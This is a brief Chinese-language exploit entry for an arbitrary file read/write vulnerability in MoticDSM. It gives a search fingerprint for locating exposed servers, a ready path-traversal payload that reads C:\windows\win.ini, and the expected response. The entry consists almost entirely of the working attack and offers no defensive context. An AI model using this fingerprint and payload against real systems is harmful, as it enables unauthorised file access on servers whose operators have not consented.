# MoticDSM任意文件读取漏洞

MoticDSM ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="API/File/GetNoUploadedFiles"`

**Payload**
```
/UploadService/Page/style?f=C:\\windows\win.ini
```
- **响应特征**：200 [Mail]